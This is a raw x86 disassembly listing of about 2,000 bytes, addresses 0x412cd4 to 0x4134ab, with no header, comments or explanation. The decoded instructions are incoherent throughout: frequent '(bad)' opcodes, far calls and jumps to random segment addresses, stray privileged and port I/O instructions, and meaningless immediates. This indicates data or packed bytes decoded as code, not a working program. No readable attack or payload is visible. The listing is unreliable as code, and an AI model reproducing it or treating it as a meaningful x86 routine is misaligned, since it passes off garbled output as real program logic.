  412cd4:	or     al,al
  412cd6:	xchg   DWORD PTR [ebp+0x23ec04ba],edx
  412cdc:	fld    QWORD PTR [ebx-0x2c2679a8]
  412ce2:	aaa    
  412ce3:	xor    ah,BYTE PTR [ebx]
  412ce5:	push   ebp
  412ce6:	call   0xc757:0x1cf8cd1e
  412ced:	xchg   ebp,eax
  412cee:	lods   al,BYTE PTR ds:[esi]
  412cef:	sub    eax,0x42d7ef19
  412cf4:	outs   dx,DWORD PTR ds:[esi]
  412cf5:	pop    edx
  412cf6:	sbb    BYTE PTR [ecx],0x6c
  412cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cfa:	mov    edx,0xedb4f999
  412cff:	and    al,0xaf
  412d01:	test   al,0xc8
  412d03:	mov    eax,0xca5e17e8
  412d08:	pop    eax
  412d09:	icebp  
  412d0a:	pusha  
  412d0b:	push   es
  412d0c:	pop    edx
  412d0d:	mov    eax,0xe5240155
  412d12:	xor    BYTE PTR [esi],ch
  412d14:	(bad)  
  412d15:	fiadd  DWORD PTR [ebx+ecx*8+0x538c66cf]
  412d1c:	adc    eax,0xbe813664
  412d21:	mov    dh,0xc2
  412d23:	mov    al,0xf5
  412d25:	dec    esp
  412d26:	data16 (bad) 
  412d28:	xchg   esp,eax
  412d29:	es and al,0xd4
  412d2c:	out    0xf6,al
  412d2e:	xchg   ebx,eax
  412d2f:	ficom  DWORD PTR [esi+ebx*8]
  412d32:	xor    eax,0x6646b35
  412d37:	aam    0xa1
  412d39:	inc    esi
  412d3a:	mov    dl,0xd6
  412d3c:	jno    0x412cd4
  412d3e:	mov    BYTE PTR [ebp-0x70],0xa6
  412d42:	add    ebx,ebp
  412d44:	sub    BYTE PTR [edi-0x60],ch
  412d47:	ret    
  412d48:	mov    bh,0xe5
  412d4a:	(bad)  
  412d4b:	(bad)  [edx+0x26e75238]
  412d51:	xchg   edx,eax
  412d52:	jle    0x412dcd
  412d54:	mov    bh,BYTE PTR ds:0x3ef1b7e6
  412d5a:	add    al,0xfd
  412d5c:	jl     0x412d73
  412d5e:	pop    ss
  412d5f:	loope  0x412d82
  412d61:	mov    cl,0x8f
  412d63:	adc    al,0x3d
  412d65:	lea    eax,[ecx]
  412d67:	rcr    BYTE PTR ds:0x9d128ca5,0xd4
  412d6e:	jbe    0x412d62
  412d70:	xchg   DWORD PTR [ebp+0x79],edi
  412d73:	adc    esp,DWORD PTR [esi]
  412d75:	add    eax,0x6ad30bde
  412d7a:	or     al,0x73
  412d7c:	mov    al,0x86
  412d7e:	js     0x412d66
  412d80:	(bad)  [esi]
  412d82:	lock and BYTE PTR [eax-0x5b85020],bh
  412d89:	test   eax,0xad36fff5
  412d8e:	fimul  WORD PTR ds:0x7d55bc36
  412d94:	cmp    DWORD PTR [ebx],ecx
  412d96:	mov    bh,0xa1
  412d98:	pop    esp
  412d99:	jno    0x412dd3
  412d9b:	inc    ecx
  412d9c:	rcl    DWORD PTR es:[ebx+0x2e],0x50
  412da1:	repz mov ebx,0xc62dbb8d
  412da7:	sti    
  412da8:	(bad)  
  412dab:	sub    al,0x40
  412dad:	iret   
  412dae:	ror    DWORD PTR [eax],0xb1
  412db1:	xlat   BYTE PTR ds:[ebx]
  412db2:	aas    
  412db3:	repnz scas eax,DWORD PTR es:[edi]
  412db5:	out    dx,al
  412db6:	jle    0x412d73
  412db8:	retf   0x1190
  412dbb:	out    0xa1,al
  412dbd:	add    DWORD PTR [edi+0x73],ebx
  412dc0:	mov    ds:0xeb106169,al
  412dc5:	lods   al,BYTE PTR ds:[esi]
  412dc6:	hlt    
  412dc7:	mov    WORD PTR [esi+eiz*1-0x39f7fd98],ss
  412dce:	ror    bl,cl
  412dd0:	mov    ds:0x52ad28,eax
  412dd5:	xor    eax,0x579d3ff
  412dda:	and    eax,0xa01c4eb8
  412ddf:	bound  ecx,QWORD PTR [edx]
  412de1:	das    
  412de2:	bound  edi,QWORD PTR [ebx-0x7fc10078]
  412de8:	inc    bp
  412dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412deb:	inc    esi
  412dec:	cli    
  412ded:	gs dec esp
  412def:	xchg   edi,eax
  412df0:	outs   dx,BYTE PTR ds:[esi]
  412df1:	ins    BYTE PTR es:[edi],dx
  412df2:	pop    eax
  412df3:	inc    ecx
  412df4:	repz cmp cl,BYTE PTR [ebx+0x1d6acb5]
  412dfb:	fld    TBYTE PTR [edi-0x7c]
  412dfe:	inc    edi
  412dff:	mov    ecx,DWORD PTR [eax-0x7b]
  412e02:	mov    dl,0xe7
  412e04:	ror    BYTE PTR [edi-0x52cf9824],cl
  412e0a:	int3   
  412e0b:	inc    edi
  412e0c:	mov    bl,0x1
  412e0e:	loope  0x412e50
  412e10:	dec    edi
  412e11:	imul   esi,DWORD PTR [esi+0x67],0x5b
  412e15:	add    eax,0xe6920fc9
  412e1a:	and    DWORD PTR [esp+ebp*4-0x6212b18a],edi
  412e21:	int3   
  412e22:	test   al,0xa7
  412e24:	sti    
  412e25:	jecxz  0x412de8
  412e27:	pushf  
  412e28:	or     al,0xac
  412e2a:	inc    ebp
  412e2b:	idiv   DWORD PTR [edi-0x3f14843e]
  412e31:	sbb    edi,eax
  412e33:	or     BYTE PTR [esi+0x7f0c9b03],al
  412e39:	dec    ecx
  412e3a:	jmp    0x412e3b
  412e3c:	inc    esp
  412e3d:	push   0x73
  412e3f:	rcl    BYTE PTR [edi],0x93
  412e42:	sbb    DWORD PTR fs:[ecx+edi*4-0x2e],ecx
  412e47:	loopne 0x412de4
  412e49:	shl    edx,1
  412e4b:	mov    esi,0x2c9773f3
  412e50:	add    al,0x42
  412e52:	push   ebx
  412e53:	jbe    0x412e79
  412e55:	sti    
  412e56:	mov    dl,0x27
  412e58:	pop    ecx
  412e59:	sbb    eax,0x94112add
  412e5e:	adc    DWORD PTR [eax+0x3fe45bed],ebp
  412e64:	jo     0x412ed7
  412e66:	pop    es
  412e67:	and    al,0x2e
  412e69:	ss mov dh,0x32
  412e6c:	clc    
  412e6d:	mov    fs,WORD PTR [eax-0x62b0d782]
  412e73:	stc    
  412e74:	mov    ss,WORD PTR [edx+0x149d0a9]
  412e7a:	pushf  
  412e7b:	inc    ebp
  412e7c:	sbb    al,0xd3
  412e7e:	xchg   esi,esi
  412e80:	pop    edi
  412e81:	and    eax,0x3d1a2630
  412e86:	jno    0x412ecc
  412e88:	pop    ss
  412e89:	call   0xed56:0xbc079c9e
  412e90:	imul   ecx,DWORD PTR [eax+ebx*4],0xffffffc2
  412e94:	cmp    al,0x61
  412e96:	test   eax,0x1a3190d1
  412e9b:	outs   dx,BYTE PTR ds:[esi]
  412e9c:	inc    ecx
  412e9d:	nop
  412e9e:	loope  0x412e4a
  412ea0:	sar    BYTE PTR [ebx-0x3a],1
  412ea3:	ss cli 
  412ea5:	cdq    
  412ea6:	retfw  0xe209
  412eaa:	mov    eax,ds:0xf47594ab
  412eaf:	cmp    DWORD PTR [ecx-0x45d2e191],esi
  412eb5:	lods   eax,DWORD PTR ds:[esi]
  412eb6:	(bad)  
  412eb7:	cs repz (bad) 
  412eba:	ds push esp
  412ebc:	loopne 0x412eaf
  412ebe:	aas    
  412ebf:	sbb    DWORD PTR [eax-0x14b5e10a],ebx
  412ec5:	imul   eax,DWORD PTR [ecx-0x63],0x57a997a6
  412ecc:	push   0x888a3317
  412ed1:	inc    edi
  412ed2:	or     BYTE PTR [esi+0x6a],0xd1
  412ed6:	jb     0x412f37
  412ed8:	pop    ds
  412ed9:	pop    ecx
  412eda:	inc    eax
  412edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412edc:	in     eax,dx
  412edd:	stos   BYTE PTR es:[edi],al
  412ede:	fucompp 
  412ee0:	or     BYTE PTR [esi],dl
  412ee2:	xchg   esi,eax
  412ee3:	dec    ecx
  412ee4:	aad    0xba
  412ee6:	push   esi
  412ee7:	adc    ah,BYTE PTR [esi]
  412ee9:	loop   0x412eb1
  412eeb:	js     0x412edd
  412eed:	jle    0x412ef4
  412eef:	xor    al,0xf2
  412ef1:	cmp    edi,DWORD PTR [ecx]
  412ef3:	cmc    
  412ef4:	jp     0x412ed3
  412ef6:	(bad)  
  412ef7:	retf   0xce5f
  412efa:	pop    ds
  412efb:	add    dh,dh
  412efd:	xchg   esp,eax
  412efe:	mov    ah,0xdf
  412f00:	adc    BYTE PTR [esi-0x5d],dh
  412f03:	jb     0x412f08
  412f05:	dec    eax
  412f06:	(bad)
  412f09:	loope  0x412f10
  412f0b:	dec    esp
  412f0c:	(bad)  
  412f0d:	jmp    0x1abc:0xb27ef3a5
  412f14:	inc    ebp
  412f15:	call   0xe9cc5224
  412f1a:	loopne 0x412f6a
  412f1c:	out    0x90,al
  412f1e:	xor    al,0x8
  412f20:	shr    DWORD PTR [ebx-0x4d],1
  412f23:	aaa    
  412f24:	outs   dx,BYTE PTR ds:[esi]
  412f25:	out    0x3,eax
  412f27:	(bad)  
  412f28:	(bad)  
  412f29:	jne    0x412ee2
  412f2b:	xchg   ebx,eax
  412f2c:	cmp    eax,0x2da04ca4
  412f31:	inc    DWORD PTR [esi]
  412f33:	lods   eax,DWORD PTR ds:[esi]
  412f34:	adc    dh,0xad
  412f37:	mov    ah,0x63
  412f39:	add    DWORD PTR [ebx+ecx*1],ecx
  412f3c:	jmp    0x412ef8
  412f3e:	mov    ds:0x734dacf,eax
  412f43:	xchg   edi,eax
  412f44:	xchg   esi,eax
  412f45:	(bad)  
  412f46:	not    BYTE PTR [edx-0x75a5771b]
  412f4c:	mov    esp,0xda9e0a13
  412f51:	mov    ebx,edx
  412f53:	adc    DWORD PTR [ebx],esi
  412f55:	cmp    al,0x3c
  412f57:	and    DWORD PTR fs:[eax],0x1a6eb134
  412f5e:	add    dl,BYTE PTR [esi+0x349a9e74]
  412f64:	push   ecx
  412f65:	ret    0xcfb
  412f68:	push   ds
  412f69:	adc    DWORD PTR [ecx-0x3fec547f],ecx
  412f6f:	push   ecx
  412f70:	mov    eax,0x95c66442
  412f75:	xor    BYTE PTR [eax+0x3],bh
  412f78:	ins    DWORD PTR es:[edi],dx
  412f79:	jmp    0xa85a:0x509e8cd
  412f80:	ror    BYTE PTR [edx],1
  412f82:	mov    eax,DWORD PTR [edx+eax*1+0x5a14f465]
  412f89:	inc    BYTE PTR [edi+0x27a7af23]
  412f8f:	inc    esp
  412f90:	test   eax,0x5c2bd9ce
  412f95:	sub    al,0xb5
  412f97:	shl    DWORD PTR [ebp+0x35],cl
  412f9a:	pop    edi
  412f9b:	sbb    ch,dh
  412f9d:	dec    ebp
  412f9e:	arpl   WORD PTR [ebp+edi*1+0x4fa646f1],dx
  412fa5:	push   ecx
  412fa6:	mov    esi,0xc9109e27
  412fab:	std    
  412fac:	jp     0x412feb
  412fae:	ins    BYTE PTR es:[edi],dx
  412faf:	xor    ch,BYTE PTR [esi]
  412fb1:	mov    bl,0xc2
  412fb3:	call   0xb771:0xdf502221
  412fba:	sbb    DWORD PTR [esi-0x3e5baa43],edi
  412fc0:	xchg   DWORD PTR [eax-0x317ce488],esi
  412fc6:	call   0x49ef:0x19baf544
  412fcd:	arpl   WORD PTR [esi],di
  412fcf:	mov    cl,ah
  412fd1:	dec    ecx
  412fd2:	call   0xd540:0x1474fa39
  412fd9:	sbb    DWORD PTR [ebp+0x2b],ebx
  412fdc:	mov    WORD PTR [edi-0x22],es
  412fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe0:	lods   eax,DWORD PTR ds:[esi]
  412fe1:	xchg   ebp,eax
  412fe2:	push   0xffffffca
  412fe4:	sbb    BYTE PTR [ecx-0x1c],0x1c
  412fe8:	add    esi,0xe6d8386d
  412fee:	mov    esp,0x7eebd675
  412ff3:	xlat   BYTE PTR ds:[ebx]
  412ff4:	sbb    BYTE PTR [eax+ecx*1],bl
  412ff7:	test   al,0x36
  412ff9:	or     eax,edx
  412ffb:	pop    ebx
  412ffc:	ins    BYTE PTR es:[edi],dx
  412ffd:	in     al,0x9a
  412fff:	aad    0xc7
  413001:	fwait
  413002:	lods   al,BYTE PTR ds:[esi]
  413003:	mov    bl,BYTE PTR [edi-0x24]
  413006:	pop    es
  413007:	iret   
  413008:	inc    edx
  413009:	add    ch,BYTE PTR [eax+0xd]
  41300c:	sbb    cl,BYTE PTR [eax]
  41300e:	mov    cl,0x98
  413010:	pop    ebx
  413011:	add    edx,DWORD PTR [ecx-0x7b3b821e]
  413017:	int    0x9f
  413019:	rol    DWORD PTR [esi+0x3840398e],1
  41301f:	hlt    
  413020:	dec    edi
  413021:	lods   eax,DWORD PTR ds:[esi]
  413022:	dec    esi
  413023:	mov    ecx,0xaec8fca5
  413028:	fstp   QWORD PTR [ebp-0x16]
  41302b:	mov    eax,0xc5ebcb17
  413030:	scas   eax,DWORD PTR es:[edi]
  413031:	lds    eax,FWORD PTR [ebx-0x391b0326]
  413037:	into   
  413038:	sbb    ebp,ebx
  41303a:	aas    
  41303b:	ror    DWORD PTR [edi-0x3d],cl
  41303e:	sbb    DWORD PTR [eax],esi
  413040:	mov    bh,0x7c
  413042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413043:	pop    edi
  413044:	or     esi,DWORD PTR [esi-0x4eac54b0]
  41304a:	push   esp
  41304b:	cli    
  41304c:	sub    ax,0xd96d
  413050:	and    al,0xd2
  413052:	fnsave [ecx-0x3e7d5c49]
  413058:	cmp    DWORD PTR [ebx-0x680fda01],esi
  41305e:	cmp    esp,DWORD PTR [esi+0x74]
  413061:	rcl    ebx,0x3c
  413064:	jmp    FWORD PTR [eax]
  413066:	inc    esp
  413067:	jae    0x413083
  413069:	out    0x3d,al
  41306b:	push   edi
  41306c:	lahf   
  41306d:	out    0x9c,eax
  41306f:	xchg   ecx,eax
  413070:	inc    ebx
  413071:	pop    ebp
  413072:	and    edx,DWORD PTR [ebp+0x85f709c]
  413078:	add    eax,0xa4f5a5f9
  41307d:	arpl   WORD PTR [ecx+ebx*1+0x1ae1f34b],sp
  413084:	inc    edi
  413085:	test   DWORD PTR [eax-0x37],edx
  413088:	fiadd  WORD PTR [edi-0x72]
  41308b:	xor    ecx,DWORD PTR [edx-0x54]
  41308e:	xor    al,0x9c
  413090:	mov    esp,0x1f6ad38b
  413095:	or     ebx,eax
  413097:	adc    al,0x8
  413099:	pop    edi
  41309a:	pop    ss
  41309b:	repnz mov al,ds:0xaeadf59e
  4130a1:	and    al,0x53
  4130a3:	mov    edx,0x687116a2
  4130a8:	dec    edi
  4130a9:	stos   BYTE PTR es:[edi],al
  4130aa:	iret   
  4130ab:	bound  esp,QWORD PTR [edi+0x549315c5]
  4130b1:	lahf   
  4130b2:	xor    eax,0x5d860477
  4130b7:	jae    0x4130df
  4130b9:	cmc    
  4130ba:	sub    al,0x3e
  4130bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130bd:	pop    edx
  4130be:	xchg   ebp,eax
  4130bf:	fsub   DWORD PTR [esi-0x12]
  4130c2:	sbb    bh,BYTE PTR [ecx]
  4130c4:	(bad)  
  4130c5:	cmp    DWORD PTR [edx-0x78],edi
  4130c8:	cmp    eax,0xe9647d4
  4130cd:	clc    
  4130ce:	jl     0x4130b3
  4130d0:	xchg   ebp,eax
  4130d1:	sbb    al,0x6f
  4130d3:	sar    BYTE PTR [eax+0x18],1
  4130d6:	fisubr DWORD PTR [ecx+0x10]
  4130d9:	or     BYTE PTR [eax],al
  4130db:	mov    eax,0x7182eaea
  4130e0:	hlt    
  4130e1:	ret    
  4130e2:	pop    edi
  4130e3:	mov    ah,0x9f
  4130e5:	pop    esp
  4130e6:	jecxz  0x413082
  4130e8:	js     0x4130c2
  4130ea:	mov    DWORD PTR [edi-0x24f4d76d],esp
  4130f0:	scas   al,BYTE PTR es:[edi]
  4130f1:	cmp    BYTE PTR [eax+edi*8-0x4295d9e3],bl
  4130f8:	icebp  
  4130f9:	push   ss
  4130fa:	jecxz  0x413148
  4130fc:	jmp    0x4e954b4a
  413101:	mov    edi,0x94993de1
  413106:	mov    BYTE PTR [edx],dl
  413108:	xor    dl,BYTE PTR [edi-0x7a32dffe]
  41310e:	int3   
  41310f:	adc    dh,BYTE PTR ds:0x3d44da4a
  413115:	adc    dl,BYTE PTR [edi+edx*4]
  413118:	dec    eax
  413119:	mov    eax,ds:0x3cb1acc5
  41311e:	adc    ebx,esi
  413120:	pop    ss
  413121:	jne    0x41315b
  413123:	ja     0x413140
  413125:	mov    esi,0x24cab9d1
  41312a:	(bad)  
  41312b:	jmp    0xa07251e0
  413130:	sbb    dl,BYTE PTR [esi-0x30d8e62a]
  413136:	(bad)  
  413137:	call   0x617:0x2a9cdca9
  41313e:	mov    ah,0xce
  413140:	dec    esi
  413141:	and    DWORD PTR ds:[edx-0xbba72ff],ecx
  413148:	and    eax,0xc1d9721d
  41314d:	add    ch,BYTE PTR [ebx+0x581b7f19]
  413153:	aas    
  413154:	add    DWORD PTR [eax],0x13
  413157:	pop    ebx
  413158:	mov    eax,ds:0x1c3ad919
  41315d:	xchg   esi,eax
  41315e:	mov    ds:0xdfead85b,al
  413163:	cmp    esi,ebx
  413165:	retf   
  413166:	inc    edx
  413167:	rcl    DWORD PTR [ebx+0x7b43d51],0xd7
  41316e:	mov    edx,0xe594114e
  413173:	pop    ds
  413174:	out    dx,eax
  413175:	iret   
  413176:	add    DWORD PTR fs:[ebp+0x37be92ad],ebp
  41317d:	fwait
  41317e:	imul   esp,DWORD PTR [eax],0xffffff96
  413181:	and    esi,ecx
  413183:	test   DWORD PTR [ebx+esi*1-0x3db4a141],edx
  41318a:	push   es
  41318b:	ins    DWORD PTR es:[edi],dx
  41318c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41318d:	inc    ecx
  41318e:	jmp    0xfb8d:0xce7092ee
  413195:	xchg   ebp,eax
  413196:	mov    bl,BYTE PTR ds:0xb5df1eeb
  41319c:	aaa    
  41319d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319e:	xor    eax,0xb27c508d
  4131a3:	xchg   ebx,eax
  4131a4:	in     al,0xfd
  4131a6:	es xchg esi,eax
  4131a8:	lods   eax,DWORD PTR ds:[esi]
  4131a9:	xor    dl,ch
  4131ab:	inc    eax
  4131ac:	sub    eax,0x7f2a38dc
  4131b1:	shl    BYTE PTR [eax+0x59],cl
  4131b4:	and    esi,edx
  4131b6:	mov    esi,0xcbb44090
  4131bb:	mov    ecx,0xb10f1c28
  4131c1:	sar    DWORD PTR [ebp-0x6f],0xc
  4131c5:	dec    esi
  4131c6:	mov    ah,0xe9
  4131c8:	sub    BYTE PTR [eax],dh
  4131ca:	dec    sp
  4131cc:	pushf  
  4131cd:	nop
  4131ce:	hlt    
  4131cf:	fcomp  st(7)
  4131d1:	clc    
  4131d2:	pop    es
  4131d3:	loop   0x4131ea
  4131d5:	cli    
  4131d6:	xchg   DWORD PTR [edx+eax*8-0xc2fd64f],edx
  4131dd:	cs mov ah,0xc7
  4131e0:	rol    DWORD PTR [edi],1
  4131e2:	aam    0x15
  4131e4:	push   esi
  4131e5:	mov    edx,0x40cc656b
  4131ea:	jecxz  0x4131a6
  4131ec:	and    al,0x28
  4131ee:	sub    DWORD PTR [edx],ebp
  4131f0:	test   DWORD PTR ds:0x29b2538,esi
  4131f6:	mov    dh,0xc9
  4131f8:	push   ebp
  4131f9:	enter  0x9861,0xe2
  4131fd:	cmp    edi,DWORD PTR [edx-0x2e21b706]
  413203:	daa    
  413204:	les    ebp,FWORD PTR [ebx-0x49939aa7]
  41320a:	aas    
  41320b:	mov    esi,0x41e34f34
  413210:	add    DWORD PTR ds:0x4e9c5f99,esi
  413216:	xor    dl,BYTE PTR [ebp-0x3d05e16c]
  41321c:	mov    BYTE PTR [ebx],ah
  41321e:	inc    ebx
  41321f:	dec    edx
  413220:	jne    0x4131b4
  413222:	push   eax
  413223:	push   esp
  413224:	adc    edi,DWORD PTR [edx]
  413226:	inc    edx
  413227:	jge    0x4131b9
  413229:	adc    BYTE PTR [ebx+0x65],dh
  41322c:	mov    al,ds:0xdb81d56e
  413231:	cwde   
  413232:	call   0xc4e265a0
  413237:	push   eax
  413238:	xor    DWORD PTR [edi+0x54a305b9],esi
  41323e:	xchg   edx,eax
  41323f:	adc    al,BYTE PTR [ebp-0x2772e16]
  413245:	repnz ins BYTE PTR es:[edi],dx
  413247:	sbb    dh,al
  413249:	aas    
  41324a:	push   esi
  41324b:	mov    ebx,0x4607eb55
  413250:	test   DWORD PTR [ebp+0x34],esi
  413253:	(bad)  
  413254:	adc    DWORD PTR [eax-0x6bdbb70f],ecx
  41325a:	dec    ecx
  41325b:	push   ss
  41325c:	call   0x73cddb63
  413261:	lods   eax,DWORD PTR ds:[esi]
  413262:	jns    0x4132ce
  413264:	mov    al,0xde
  413266:	lock adc dl,cl
  413269:	sar    DWORD PTR [ebp+eax*8+0x20],0xf9
  41326e:	sub    al,0xb8
  413270:	push   0xffffffe2
  413272:	addr16 popf 
  413274:	dec    ebp
  413275:	xor    dh,ah
  413277:	inc    eax
  413278:	push   eax
  413279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41327a:	xchg   edi,eax
  41327b:	xlat   BYTE PTR ds:[ebx]
  41327c:	test   eax,0xd204eef8
  413281:	(bad)  
  413282:	adc    DWORD PTR [ebx],ecx
  413284:	mov    edx,0xfa1ac98c
  413289:	inc    BYTE PTR [esi+eax*2+0x4aa85e78]
  413290:	cmp    cl,al
  413292:	cmc    
  413293:	sbb    eax,0xa18dd6b8
  413298:	shl    DWORD PTR [esi+0x23],0x29
  41329c:	jbe    0x4132fa
  41329e:	clc    
  41329f:	xchg   ecx,eax
  4132a0:	sub    ebx,ebp
  4132a2:	add    edi,edx
  4132a4:	fbld   TBYTE PTR [eax+0x1d]
  4132a7:	popa   
  4132a8:	or     eax,0x100983a7
  4132ad:	mov    ds:0x61e7c9b3,eax
  4132b2:	jg     0x41327a
  4132b4:	fsubr  DWORD PTR [ebp+0x33aec037]
  4132ba:	mov    dl,0xd9
  4132bc:	xchg   edi,eax
  4132bd:	dec    ebp
  4132be:	dec    esi
  4132bf:	(bad)  
  4132c0:	ja     0x413318
  4132c2:	xor    cl,BYTE PTR [eax+0x442edcd2]
  4132c8:	jo     0x41333f
  4132ca:	mov    edi,0x62052c2d
  4132cf:	aaa    
  4132d0:	sar    bl,1
  4132d2:	dec    ecx
  4132d3:	mov    bh,0x69
  4132d5:	xor    dh,bl
  4132d7:	shr    DWORD PTR [esp+ebp*2+0x3ff53646],1
  4132de:	xchg   ebx,eax
  4132df:	sbb    dl,BYTE PTR [edi+0x5582fb0b]
  4132e5:	popf   
  4132e6:	mov    ecx,0x378c383f
  4132eb:	out    0x63,al
  4132ed:	inc    edi
  4132ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ef:	into   
  4132f0:	mov    BYTE PTR [ebp+0x48d581fc],bh
  4132f6:	inc    edi
  4132f7:	mov    al,0x4d
  4132f9:	jmp    0x7f5aef92
  4132fe:	sbb    dh,BYTE PTR [edi]
  413300:	lahf   
  413301:	retf   
  413302:	adc    eax,0x1c5a6c09
  413308:	aas    
  413309:	ds sub al,0xec
  41330c:	not    BYTE PTR [ebx]
  41330e:	fbstp  TBYTE PTR [edi]
  413310:	outs   dx,BYTE PTR ds:[esi]
  413311:	pop    es
  413312:	das    
  413313:	adc    DWORD PTR [ebx-0x6a4e6863],ecx
  413319:	popa   
  41331a:	and    ch,dh
  41331c:	rcl    BYTE PTR [edx+0x42],1
  41331f:	stc    
  413320:	sub    esp,edi
  413322:	fiadd  WORD PTR [ebx]
  413324:	push   ebp
  413325:	cwde   
  413326:	mov    bh,0x62
  413328:	in     eax,0xba
  41332a:	lahf   
  41332b:	or     cl,BYTE PTR [eax]
  41332d:	push   edx
  41332e:	jmp    0x886f:0x281ab40a
  413335:	call   0x8ef28f02
  41333a:	cmp    DWORD PTR [ecx+0x5e],esi
  41333d:	jmp    0x8309:0xa3dd23eb
  413344:	pop    edi
  413345:	js     0x4132d5
  413347:	bound  esi,QWORD PTR [edx]
  413349:	sbb    edx,ebx
  41334b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334c:	mov    cl,0x52
  41334e:	dec    edx
  41334f:	mov    esi,0x939c4df0
  413354:	pop    di
  413356:	shr    DWORD PTR [edx+0x2a],0xf8
  41335a:	jmp    0x33d7:0xd69a46da
  413361:	out    0x78,eax
  413363:	xchg   ebp,eax
  413364:	ja     0x413392
  413366:	xchg   ebx,eax
  413367:	enter  0xe238,0x36
  41336b:	hlt    
  41336c:	pop    eax
  41336d:	adc    al,0x5f
  41336f:	pusha  
  413370:	pop    eax
  413371:	pop    edx
  413373:	pop    edi
  413374:	call   0xb75ab7fd
  413379:	jae    0x4133a2
  41337b:	pop    ebp
  41337c:	stos   DWORD PTR es:[edi],eax
  41337d:	adc    DWORD PTR [edi+eax*4-0x72],edi
  413381:	inc    ecx
  413382:	enter  0xcfaf,0x7f
  413386:	or     edi,DWORD PTR [ecx-0x46f2a169]
  41338c:	test   BYTE PTR ds:[edi+ecx*8],0x2c
  413391:	popf   
  413392:	ins    BYTE PTR es:[edi],dx
  413393:	mov    ah,dl
  413395:	bound  edx,QWORD PTR [ebp+eiz*1+0x411d05f2]
  41339c:	push   esp
  41339d:	sbb    edx,DWORD PTR [ebp+0x14]
  4133a0:	repnz inc esp
  4133a2:	bound  esp,QWORD PTR [edi]
  4133a4:	int3   
  4133a5:	retf   0x7527
  4133a8:	dec    edx
  4133a9:	cli    
  4133aa:	rcl    BYTE PTR [edi+0x35b69b6d],1
  4133b0:	out    dx,al
  4133b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b2:	push   es
  4133b3:	mov    eax,ds:0xed6ebec6
  4133b8:	or     DWORD PTR [esp+eax*2+0x28],edx
  4133bc:	mov    edi,0x43522882
  4133c1:	rcl    DWORD PTR [eax-0x7770b6e2],cl
  4133c7:	mov    ecx,0x19daa9a5
  4133cc:	sub    eax,0x3964ede0
  4133d1:	inc    ecx
  4133d2:	das    
  4133d3:	push   ecx
  4133d4:	in     eax,0x12
  4133d6:	cmp    DWORD PTR [eax],0x82733ae3
  4133dc:	sbb    BYTE PTR [ebp-0x37],bl
  4133df:	lahf   
  4133e0:	add    ecx,eax
  4133e2:	jp     0x4133b6
  4133e4:	fsubr  QWORD PTR [edx-0x42fb64f1]
  4133eb:	mov    cs,WORD PTR [esi]
  4133ed:	pop    ss
  4133ee:	dec    edx
  4133ef:	jns    0x41346d
  4133f1:	or     al,0x16
  4133f3:	popa   
  4133f4:	inc    ecx
  4133f5:	pop    ebx
  4133f6:	push   edi
  4133f7:	cmp    cl,BYTE PTR [edi+ebp*4+0x50b6b975]
  4133fe:	inc    ecx
  4133ff:	stos   DWORD PTR es:[edi],eax
  413400:	mul    esp
  413402:	aas    
  413403:	mov    ch,0x2b
  413405:	mov    ecx,ecx
  413407:	ds push ebx
  413409:	ret    
  41340a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41340b:	dec    eax
  41340c:	(bad)  
  41340d:	jmp    0x4133f6
  41340f:	fld    DWORD PTR [ebp+0x4a4bc20f]
  413415:	loopne 0x4133ea
  413417:	and    DWORD PTR [ecx+0x13],ebp
  41341a:	pop    ds
  41341b:	pop    ss
  41341c:	test   eax,0x1c036d1a
  413421:	leave  
  413422:	fist   WORD PTR [ebx-0x5d]
  413425:	(bad)  
  413426:	inc    edi
  413427:	xchg   ebx,eax
  413428:	xchg   ecx,eax
  413429:	xchg   edi,eax
  41342a:	inc    eax
  41342b:	icebp  
  41342c:	ja     0x4133b4
  41342e:	sahf   
  41342f:	jp     0x4133e1
  413431:	fild   QWORD PTR [edx+ebx*1-0x5c]
  413435:	call   DWORD PTR [ebx]
  413437:	pop    DWORD PTR [eax]
  413439:	pop    eax
  41343a:	arpl   si,cx
  41343c:	xlat   BYTE PTR ds:[ebx]
  41343d:	mov    edx,0xdd507072
  413442:	je     0x41340c
  413444:	mov    bh,0xa9
  413446:	jo     0x4133e6
  413448:	mov    dh,0x87
  41344a:	cdq    
  41344b:	jp     0x4134b4
  41344d:	div    bh
  41344f:	add    al,BYTE PTR [edi-0x1d]
  413452:	gs iret 
  413454:	cmc    
  413455:	call   DWORD PTR [esp+eiz*8-0x3df4690d]
  41345c:	dec    esp
  41345d:	sbb    bh,BYTE PTR [esi+0x3e]
  413460:	jl     0x413432
  413462:	outs   dx,BYTE PTR ds:[esi]
  413463:	sub    DWORD PTR [edi],edx
  413465:	or     DWORD PTR [edx-0x5a],edi
  413468:	lea    ebx,[ebp+0x70]
  41346b:	dec    eax
  41346c:	add    ecx,DWORD PTR [ebx]
  41346e:	ficom  WORD PTR [ecx-0x23]
  413471:	jns    0x413422
  413473:	out    0x29,eax
  413475:	imul   edi,DWORD PTR ds:0x48e5cfb0,0x25
  41347c:	retf   
  41347d:	jno    0x413460
  41347f:	and    DWORD PTR [esi],edi
  413481:	popf   
  413482:	das    
  413483:	stos   DWORD PTR es:[edi],eax
  413484:	repz xor DWORD PTR [edx+esi*2+0xe3f8890],0xffffff86
  41348d:	push   0x31724d8e
  413492:	jo     0x413457
  413494:	xchg   esi,eax
  413495:	int3   
  413496:	into   
  413497:	mov    dh,0xdf
  413499:	int3   
  41349a:	fcomp  st(1)
  41349c:	je     0x41341e
  41349e:	or     esp,DWORD PTR [eax]
  4134a0:	mov    ds:0xec6ed75e,eax
  4134a5:	(bad)  
  4134a6:	in     al,dx
  4134a7:	clc    
  4134a8:	bound  ebx,QWORD PTR [ebx]
  4134aa:	lods   eax,DWORD PTR ds:[esi]
  4134ab:	fldcw  WORD PTR [ebx-0x24]
